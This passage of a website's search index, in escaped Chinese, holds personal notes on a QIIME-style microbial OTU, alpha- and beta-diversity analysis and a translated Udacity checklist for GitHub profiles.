picking\u6b65\u9aa4\u7684\u751f\u6210\u7ed3\u679c</p>"},{"location":"doc/biology/ecology/#otu-de-novo-otu-picking","title":"\u4ece\u5934\u5f00\u59cb\u7684OTU\u7ec4\u88c5 De novo OTU picking","text":"<p>\u7531\u4e8e\u7f3a\u5c11\u539f\u59cb\u6587\u4ef6\uff0c\u672c\u6b65\u9aa4\u65e0\u6cd5\u590d\u73b0\uff0c\u8fd0\u7b97\u7ed3\u679c\u4e3a\u7ed9\u51fa\u7684otus_BF.rar</p> <p>\u6b64\u6b65\u9aa4\u751f\u6210\u4e86rep_set.tre\uff0c\u4f7f\u7528FigTree\u8f6f\u4ef6\u8fdb\u884c\u67e5\u770b\uff1a</p> <p></p>"},{"location":"doc/biology/ecology/#otu-table","title":"\u67e5\u770b\u4ea7\u751f\u7684OTU Table","text":"<p>summarize.txt</p> <p>\u4e00\u5171\u670950\u4e2a\u6837\u672c\uff0c\u53c2\u7167\u7ed9\u51fa\u7684\u539f\u59cbBF_Map.txt\uff0872\u4e2a\u6837\u672c\uff09\uff0c \u53d1\u73b0\u5176\u4e2d\u7684F.TagA.3C.12\u548cF.TagA.3C.13\u7684Count\u6570\u592a\u5c0f\u53ef\u4ee5\u5ffd\u7565\uff0c\u6bd4\u8f83\u4e24\u4e2a\u6587\u4ef6\u53d1\u73b0ID\u4e3aTagA\u7684\u90fd\u6ca1\u6709\u51fa\u73b0\u5728\u7ed9\u51fa\u7684OTU Table\u4e2d</p> <p>\u6280\u672fPoint:\u7528Excel\u6bd4\u8f83\u4e24\u5217\u76f8\u540c\u5143\u7d20http://jingyan.baidu.com/article/c843ea0b7a2a7477921e4a47.html</p>"},{"location":"doc/biology/ecology/#make-an-otu-network","title":"Make an OTU network","text":"<p>\u4eba\u5bb6\u8bf4\u8981\u7528Cytoscape\uff0c\u6709\u5f85\u7814\u7a76</p> <p>\u751f\u6210\u7684otu_network\u6587\u4ef6\u5939\u6233\u8fd9\u91cc\u4e0b\u8f7d</p>"},{"location":"doc/biology/ecology/#summarize-communities-by-taxonomic-composition","title":"\u7269\u79cd\u5206\u7c7b\u7edf\u8ba1 Summarize communities by taxonomic composition","text":"<p>\u751f\u6210\u7684taxa_summary\u6587\u4ef6\u5939,\u6233\u6211\u4e0b\u8f7d</p> <p>\u8fd9\u91cc\u662f\u91cd\u70b9</p> <p>\u6253\u5f00taxa_summary/taxa_summary_plots\u6587\u4ef6\u5939\uff0c\u91cc\u9762\u6709\u4e24\u4e2a\u7f51\u9875\uff0c</p> <p>\u7f51\u9875\u6253\u5f00\u540e5\u5f20\u56fe\uff0c\u6bcf\u5f20\u56fe\u7684\u6a2a\u5750\u6807\u90fd\u662f50\u4e2a\u6837\u672c\uff0c\u4ece\u4e0a\u5230\u4e0b\u5206\u7c7b\u9636\u5143\u8d8a\u6765\u8d8a\u7ec6</p> <p>\u9009\u62e9\u6700\u9ad8\u5c42\u6b21\u7684\u8fd9\u5f20bar\u56fe\u5427\uff1a</p> <p></p> <p>\u89e3\u538b\u538b\u7f29\u5305\u540e\u6253\u5f00\u7f51\u9875\uff0c\u7528\u9f20\u6807\u629a\u6478\u8fd9\u5f20\u56fe\u53ef\u4ee5\u770b\u5230\u5206\u7c7b\u4fe1\u606f</p> <p>\u5e95\u4e0b\u7ea2\u8272\u662f\u6700\u591a\u7684\uff0c\u662fOther</p> <p>\u5176\u6b21\u6700\u591a\u7684\u770b\u8d77\u6765\u662f\u4e0a\u8fb9\u7684\u7ea2\u8272\u7684\uff0cProteobacteria</p>"},{"location":"doc/biology/ecology/#make-a-taxonomy-heatmap","title":"\u4ea7\u751f\u70ed\u56feMake a taxonomy heatmap","text":""},{"location":"doc/biology/ecology/#alpha","title":"\u8ba1\u7b97alpha\u591a\u6837\u6027","text":"<p>\u751f\u6210\u7684arare\u6587\u4ef6\u5939\u6233\u6211\u4e0b\u8f7d</p> <p>alpha\u591a\u6837\u6027\u7684\u8ba1\u7b97\u7ed3\u679c\u5728arare/alpha_div_collated\u4e2d\uff0c\u91cc\u9762\u6709</p> <ul> <li>shannon.txt</li> <li>simpson.txt</li> <li>observed_otus.txt \u8fd9\u5c31\u662fPPT\u8981\u6c42\u7684Observed species</li> </ul> <p>\u6bcf\u4e00\u5217\u662f\u4e00\u4e2a\u6837\u672c</p> <p>\u6bcf\u4e00\u884c\u884c\u662f\u53d6\u6837\u5927\u5c0f+\u8fed\u4ee3\u6b21\u6570\uff1a</p> <p>rarefaction_##_#.txt: the first set of numbers represents the number of sequences sampled, and the last number represents the iteration number</p> <p>\u7528\u4e0d\u540c\u7684\u91c7\u6837\u5927\u5c0f\u53ef\u4ee5\u5f97\u5230\u4e0d\u540c\u7684\u6570\u503c\uff0c\u5c31\u53ef\u4ee5\u753b\u51fa\u4e0b\u9762\u8fd9\u4e9b\u56fe</p>"},{"location":"doc/biology/ecology/#alpha_1","title":"\u770balpha\u7a00\u758f\u56fe","text":"<p>\u9996\u5148\u4e86\u89e3\u8fd9\u662f\u4e2a\u4ec0\u4e48\u4e1c\u897f Wikipedia</p> <p></p> <p></p> <p></p> <p>\u95ee\u9898\uff1a\u5982\u679c\u4f7f\u7528Category:Treatment, \u6570\u636e\u4e0a\u5f88\u591aNaN\uff0c\u770b\u4e0d\u51fa\u4e0d\u540c\u5904\u7406\u7684\u663e\u8457\u6027\u5dee\u5f02</p>"},{"location":"doc/biology/ecology/#beta-compute-beta-diversity-and-generate-ordination-plots","title":"\u8ba1\u7b97beta\u591a\u6837\u6027 Compute beta diversity and generate ordination plots","text":"<p>bdiv_even146.zip\u6233\u6211\u4e0b\u8f7d</p>"},{"location":"doc/biology/ecology/#unweighted","title":"Unweighted","text":"<p>\u7ea2\u8272Control \u84dd\u8272Warming</p> <p></p> <p></p> <p>Treatment\u4e0a\u6ca1\u6709\u663e\u8457\u6027\u533a\u522b</p> <p>\u90a3\u4ec0\u4e48\u5177\u6709\u663e\u8457\u6027\u533a\u522b\u5462\uff1f</p> <p>\u624b\u5de5\u6807\u4e0a\u989c\u8272\uff1a</p> <p>\u9ec4\u8272 TagC_13 \u7eff\u8272 TagB_13 \u84dd\u8272 TagC_12 \u7ea2\u8272 TagB_12</p> <p></p> <p>\u53d1\u73b0\u6837\u672c\u6700\u540e\u7684\u6807\u53f712\u4e0e13\u624d\u662f\u6700\u663e\u8457\u7684\u533a\u522b\u6765\u6e90\uff01</p>"},{"location":"doc/biology/ecology/#weighted","title":"Weighted","text":"<p>\u540c\u6837\u5728Treatment\u4e0a\u6ca1\u6709\u663e\u8457\u6027\u5dee\u5f02</p>"},{"location":"doc/github/github_profile_checklist/","title":"Github \u68c0\u67e5\u8868 [\u6c42\u804c\u5411]","text":"<p>\u672c\u6587\u6863\u7ffb\u8bd1\u81eaUdacity\u8bfe\u7a0b\u8d44\u6599\uff0c\u539f\u6587\u5728\u6b64</p>"},{"location":"doc/github/github_profile_checklist/#_1","title":"\u4e00\u822c\u6027\u7684","text":"<ol> <li> <p>\u6211\u5728Github\u4e0a\u81f3\u5c11\u67094\u4e2a\u81ea\u5df1\u7684\u9879\u76ee</p> </li> <li> <p>\u6211\u6709\u6301\u7eed\u6027\u5730\u4e3a\u9879\u76ee\u4f5c\u51fa\u63d0\u4ea4</p> </li> <li> <p>\u81f3\u5c11\u4e24\u5468\u6bcf\u5929\u90fd\u575a\u6301\u63d0\u4ea4\uff0c\u65e0\u8bba\u63d0\u4ea4\u6709\u591a\u4e48\u5c0f</p> </li> <li> <p>\u6211\u53c2\u4e0e\u8fc7\u81f3\u5c11\u4e00\u4e2a\u5f00\u6e90\u9879\u76ee</p> </li> </ol>"},{"location":"doc/github/github_profile_checklist/#_2","title":"\u4e2a\u4eba\u4fe1\u606f","text":"<p>1.\u6211\u6709\u4e00\u4e2a\u6b63\u5f0f\u7684github\u7528\u6237\u540d\uff0c\u5982\u6709\u53ef\u80fd\u8fd9\u4e2a\u7528\u6237\u540d\u5c31\u662f\u6211\u7684\u540d\u5b57</p> <p>2.\u6211\u6709\u6b63\u5f0f\u7684\u4e2a\u4eba\u5934\u50cf\uff0c\u5efa\u8bae\u4f7f\u7528\u81ea\u4fe1\u9633\u5149\u7684\u4e2a\u4eba\u7167\u7247</p> <p>3.URL\u3001\u516c\u53f8\u3001\u90ae\u7bb1\u90e8\u5206\u7b49\u4e2a\u4eba\u4fe1\u606f\u4e0d\u4e3a\u7a7a\u4e14\u4fdd\u6301\u6700\u65b0</p>"},{"location":"doc/github/github_profile_checklist/#_3","title":"\u9879\u76ee","text":"<p>1.\u6211\u81f3\u5c11\u5bf9\u6211\u60f3\u5173\u6ce8\u7684\u9879\u76ee\u7ed9\u51fa\u4e00\u4e2aStar</p> <p>2.\u6211\u7684\u9879\u76ee\u6709\u4e00\u4e2a\u5408\u7406\u7684\u540d\u79f0\uff08\u53ef\u4ee5\u5728\u9879\u76ee\u9007Settings\u4e2d\u4fee\u6539\uff09</p> <p>3.\u6211\u7684\u9879\u76ee\u6709\u5b8c\u6574\u7684README\uff0c\u8bf4\u660e\u521b\u5efa\u8fd9\u4e2a\u9879\u76ee\u7684\u76ee\u7684\uff0c\u4f7f\u7528\u8fd9\u4e2a\u9879\u76ee\u7684\u65b9\u6cd5\uff0c\u5bfb\u6c42\u600e\u6837\u7684\u5408\u4f5c\u3002(Fork\u7684\u9879\u76ee\u4e0d\u9700\u8981\u4fee\u6539README)</p> <p>4.\u9879\u76ee\u7684\u6240\u6709\u4fee\u6539\u90fd\u8981\u6709\u63d0\u4ea4\u4fe1\u606f\u6765\u89e3\u91ca\u8fdb\u884c\u7684\u4fee\u6539</p> <p>5.\u9075\u5faa\u63d0\u4ea4\u4fe1\u606f\u7684\u98ce\u683c\uff0c\u6233\u8fd9\u91cc -&gt; http://udacity.github.io/git-styleguide/</p>"}]}